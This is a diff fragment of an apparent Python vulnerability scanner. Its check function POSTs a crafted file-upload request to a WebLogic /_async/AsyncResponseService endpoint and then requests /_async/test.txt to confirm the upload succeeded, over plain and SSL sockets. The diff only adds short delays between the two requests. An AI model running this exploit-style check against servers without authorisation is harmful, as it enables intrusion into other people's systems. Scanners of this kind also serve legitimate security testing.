@@ -21097,6 +21097,7 @@ def check(ip):
             client3.connect((ip,int(port)))
             client3.sendall('''POST /_async/AsyncResponseService HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type:text/xml\r\nCookie:53237323d293130323d256673642424242478747e2473756474242424216\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length_upfile,payload_upfile))
             client3.close()
+            time.sleep(0.5)
             client3 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  #检测上传的test.txt是否存在
             client3.connect((ip,int(port)))
             client3.sendall('''GET /_async/test.txt HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n\r\n'''.format(ip,port))
@@ -21123,6 +21124,7 @@ def check(ip):
             client3.connect((ip,int(port)))
             client3.sendall('''POST /_async/AsyncResponseService HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nContent-Type:text/xml\r\nCookie:53237323d293130323d256673642424242478747e2473756474242424216\r\nContent-Length:{}\r\n\r\n{}'''.format(ip,port,content_length_upfile,payload_upfile))
             client3.close()
+            time.sleep(0.5)
             client3 = ssl.wrap_socket(socket.socket())
             client3.connect((ip,int(port)))
             client3.sendall('''GET /_async/test.txt HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n\r\n'''.format(ip,port))
